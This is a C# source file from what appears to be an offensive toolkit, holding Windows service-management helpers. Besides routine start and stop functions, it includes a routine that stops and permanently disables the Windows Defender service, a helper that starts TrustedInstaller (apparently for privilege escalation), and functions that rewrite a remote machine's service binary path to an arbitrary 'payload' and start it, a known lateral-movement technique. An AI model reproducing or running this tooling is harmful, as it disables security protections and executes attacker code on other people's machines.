using System;
using TurtleToolKitManaged;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.ComponentModel;


namespace TurtleToolKitServices
{
    class Services
    {
        public static void ChangeStartMode(ServiceController svc, ServiceStartMode mode)
        {
            var scManagerHandle = Win32.OpenSCManager(null, null, Win32.SC_MANAGER_ALL_ACCESS);
            if (scManagerHandle == IntPtr.Zero)
            {
                throw new ExternalException("Open Service Manager Error");
            }

            var serviceHandle = Win32.OpenService(
                scManagerHandle,
                svc.ServiceName,
                Win32.SERVICE_QUERY_CONFIG | Win32.SERVICE_CHANGE_CONFIG);

            if (serviceHandle == IntPtr.Zero)
            {
                throw new ExternalException("Open Service Error");
            }

            var result = Win32.ChangeServiceConfig(
                serviceHandle,
                Win32.SERVICE_NO_CHANGE,
                (uint)mode,
                Win32.SERVICE_NO_CHANGE,
                null,
                null,
                IntPtr.Zero,
                null,
                null,
                null,
                null);

            if (result == false)
            {
                int nError = Marshal.GetLastWin32Error();
                var win32Exception = new Win32Exception(nError);
                throw new ExternalException("Could not change service start type: "
                    + win32Exception.Message);
            }

            Win32.CloseServiceHandle(serviceHandle);
            Win32.CloseServiceHandle(scManagerHandle);
        }

        public enum SimpleServiceCustomCommands
        { StopWorker = 128, RestartWorker, CheckWorker };
        public static int StopWinDefend()
        {
            ServiceController[] scServices;
            scServices = ServiceController.GetServices();
            foreach (ServiceController service in scServices)
            {
                if (service.ServiceName == "WinDefend")
                {
                    if (service.Status != ServiceControllerStatus.Running)
                    {
                        Console.WriteLine("Defender already disabled...exiting");
                        return 0;
                    }
                    service.Stop();
                    service.WaitForStatus(ServiceControllerStatus.Stopped);
                    Console.WriteLine("windefend stoppped");
                    ChangeStartMode(service, ServiceStartMode.Disabled);
                    return 0;
                }
            }
            Console.WriteLine("windefend not found or stoppped");
            return 1;
        }
        public static int StartTrustedInstaller()
        {
            ServiceController[] scServices;
            scServices = ServiceController.GetServices();
            foreach (ServiceController service in scServices)
            {
                if (service.ServiceName == "TrustedInstaller")
                {
                    Console.WriteLine("Attempting to start trusted installer");
                    if (service.Status != ServiceControllerStatus.Running)
                    {
                        service.Start();
                        service.WaitForStatus(ServiceControllerStatus.Running);
                        Console.WriteLine("Trusted installer started");
                        return 0;
                    }
                    else
                    {
                        Console.WriteLine("Trusted installer already running");
                        return 0;
                    }

                }
            }
            Console.WriteLine("trusted installer not found");
            return 1;
        }

        public static int StartService(string serviceName)
        {
            ServiceController[] scServices;
            scServices = ServiceController.GetServices();
            foreach (ServiceController service in scServices)
            {
                if (service.ServiceName == serviceName)
                {
                    Console.WriteLine("Attempting to start {0}",serviceName);
                    if (service.Status != ServiceControllerStatus.Running)
                    {
                        service.Start();
                        service.WaitForStatus(ServiceControllerStatus.Running);
                        Console.WriteLine("{0} started",serviceName);
                        return 0;
                    }
                    else
                    {
                        Console.WriteLine("{0} already running...Exiting..",serviceName);
                        return 0;
                    }

                }
            }
            Console.WriteLine("{0} not found",serviceName);
            return 1;
        }

        public static int StopService(string serviceName)
        {
            ServiceController[] scServices;
            scServices = ServiceController.GetServices();
            foreach (ServiceController service in scServices)
            {
                if (service.ServiceName == serviceName)
                {
                    if (service.Status != ServiceControllerStatus.Running)
                    {
                        Console.WriteLine("{0} already stopped...exiting",serviceName);
                        return 0;
                    }
                    service.Stop();
                    service.WaitForStatus(ServiceControllerStatus.Stopped);
                    Console.WriteLine("{} stoppped",serviceName);
                    return 0;
                }
            }
            Console.WriteLine("{0} not found or stoppped",serviceName);
            return 1;
        }


        public static bool QueryRemoteServiceBinaryPath(string target, string serviceName, ref string binaryPath)
        {
            var scManagerHandle = Win32.OpenSCManager(target, null, Win32.SC_MANAGER_ALL_ACCESS);
            if (scManagerHandle == IntPtr.Zero)
            {
                Console.WriteLine("Open Service Manager Error");
                return false;
            }

            var serviceHandle = Win32.OpenService(scManagerHandle, serviceName, Win32.SERVICE_ALL_ACCESS);

            if (serviceHandle == IntPtr.Zero)
            {
                Console.WriteLine("Open Service Error");
                return false;
            }
            uint structSz;
            Win32.QueryServiceConfig(serviceHandle, IntPtr.Zero, 0, out structSz);
            // create buffer to hold config
            IntPtr ptr = Marshal.AllocHGlobal((int)structSz);
            var success = Win32.QueryServiceConfig(serviceHandle, ptr, structSz, out structSz);
            if (!success)
            {
                Console.WriteLine("Failed second service query");
                Marshal.FreeHGlobal(ptr);
                return false;
            }
            Win32.QueryServiceConfigStruct configStruct = (Win32.QueryServiceConfigStruct)Marshal.PtrToStructure(ptr, typeof(Win32.QueryServiceConfigStruct));
            string path = Marshal.PtrToStringAuto(configStruct.binaryPathName);
            Marshal.FreeHGlobal(ptr);
            binaryPath = path;
            Win32.CloseServiceHandle(serviceHandle);
            Win32.CloseServiceHandle(scManagerHandle);
            return true;
        }

        public static bool EditRemoteServiceBinary(string target, string serviceName, string payload)
        {
            var scManagerHandle = Win32.OpenSCManager(target, null, Win32.SC_MANAGER_ALL_ACCESS);
            if (scManagerHandle == IntPtr.Zero)
            {
                Console.WriteLine("Open Service Manager Error");
                return false;
            }

            var serviceHandle = Win32.OpenService(scManagerHandle, serviceName, Win32.SERVICE_ALL_ACCESS);

            if (serviceHandle == IntPtr.Zero)
            {
                Console.WriteLine("Open Service Error");
                return false;
            }
            var result = Win32.ChangeServiceConfig(serviceHandle, Win32.SERVICE_NO_CHANGE, 3, Win32.SERVICE_ERROR_IGNORE, payload, null, IntPtr.Zero, null, null, null, null);
            if (result == false)
            {
                int nError = Marshal.GetLastWin32Error();
                var win32Exception = new Win32Exception(nError);
                Console.WriteLine("Could not change service binary: " + win32Exception.Message);
                return false;
            }
            Win32.CloseServiceHandle(serviceHandle);
            Win32.CloseServiceHandle(scManagerHandle);
            return true;
        }

        public static bool StartRemoteService(string target, string serviceName)
        {
            var scManagerHandle = Win32.OpenSCManager(target, null, Win32.SC_MANAGER_ALL_ACCESS);
            if (scManagerHandle == IntPtr.Zero)
            {
                Console.WriteLine("Open Service Manager Error");
                return false;
            }

            var serviceHandle = Win32.OpenService(scManagerHandle, serviceName, Win32.SERVICE_ALL_ACCESS); // all accesss

            if (serviceHandle == IntPtr.Zero)
            {
                Console.WriteLine("Open Service Error");
                return false;
            }
            var res = Win32.StartService(serviceHandle, 0, null);
            Win32.CloseServiceHandle(serviceHandle);
            Win32.CloseServiceHandle(scManagerHandle);
            return res;
        }
        public static bool StopRemoteService(string target, string serviceName)
        {
            var scManagerHandle = Win32.OpenSCManager(target, null, Win32.SC_MANAGER_ALL_ACCESS);
            if (scManagerHandle == IntPtr.Zero)
            {
                Console.WriteLine("Open Service Manager Error");
                return false;
            }

            var serviceHandle = Win32.OpenService(scManagerHandle, serviceName, Win32.SERVICE_ALL_ACCESS); // all accesss
            if (serviceHandle == IntPtr.Zero)
            {
                Console.WriteLine("Open Service Error");
                return false;
            }
            Win32.SERVICE_STATUS status = new Win32.SERVICE_STATUS();
            var res = Win32.ControlService(serviceHandle, Win32.SERVICE_CONTROL.STOP,ref status);
            if (!res)
            {
                //Console.WriteLine("Failed to stop service");
                //Console.WriteLine(status.dwCurrentState);
                //Console.WriteLine(Marshal.GetLastWin32Error());
                Win32.CloseServiceHandle(serviceHandle);
                Win32.CloseServiceHandle(scManagerHandle);
                return res;

            }
            Win32.CloseServiceHandle(serviceHandle);
            Win32.CloseServiceHandle(scManagerHandle);
            return res;
        }
    }
}
